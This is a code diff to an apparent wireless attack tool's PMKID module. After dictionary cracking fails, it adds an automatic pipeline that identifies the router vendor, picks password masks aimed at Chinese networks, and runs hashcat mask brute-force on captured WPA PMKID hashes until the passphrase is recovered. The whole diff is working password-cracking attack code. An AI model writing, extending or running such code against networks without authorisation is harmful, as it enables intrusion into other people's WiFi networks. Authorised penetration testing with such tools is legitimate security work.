@@ -152,11 +152,15 @@ class AttackPMKID(Attack):
                           'hashcat -m 22000 + {C}%s{W} ...\n' % Configuration.wordlist)
             key = Hashcat.crack_pmkid(pmkid_file)
 
+        # 国内 WiFi 智能优化：字典失败后自动追加国内常用掩码管线（闭环）
+        if key is None and getattr(Configuration, 'cn_optimize', False):
+            key = self._cn_mask_pipeline(pmkid_file)
+
         if key is None:
-            if Configuration.wordlist is not None:
+            if Configuration.wordlist is not None or getattr(Configuration, 'cn_optimize', False):
                 Color.clear_entire_line()
                 Color.pattack('PMKID', self.target, '{R}CRACK',
-                              '{R}Failed {O}Passphrase not found in dictionary.\n')
+                              '{R}Failed {O}Passphrase not found in dictionary/masks.\n')
             return False
 
         Color.clear_entire_line()
@@ -166,6 +170,25 @@ class AttackPMKID(Attack):
         Color.pl('\n')
         self.crack_result.dump()
         return True
+
+    def _cn_mask_pipeline(self, pmkid_file):
+        '''国内 WiFi 掩码自动管线：按优先级跑掩码爆破，命中即返回。'''
+        from ..util.cn_strategy import recommend_masks
+        from ..util.router_advisory import identify_vendor
+        vendor = identify_vendor(self.target.bssid) or ''
+        masks = recommend_masks(self.target.essid, vendor,
+                                limit=getattr(Configuration, 'cn_mask_limit', 4))
+        Color.clear_entire_line()
+        Color.pattack('PMKID', self.target, 'CN-OPT',
+                      '{O}国内掩码管线 / CN mask pipeline: {C}%d 阶段{W}\n' % len(masks))
+        for idx, mask in enumerate(masks, 1):
+            Color.clear_entire_line()
+            Color.pattack('PMKID', self.target, 'CN-OPT',
+                          'mask {C}%d/%d{W} {D}%s{W} ...\n' % (idx, len(masks), mask))
+            key = Hashcat.crack_hc22000_mask(pmkid_file, mask, verbose=False)
+            if key:
+                return key
+        return None
 
     def dumptool_thread(self):
         dumptool = HcxDumpTool(self.target, self.pcapng_file)
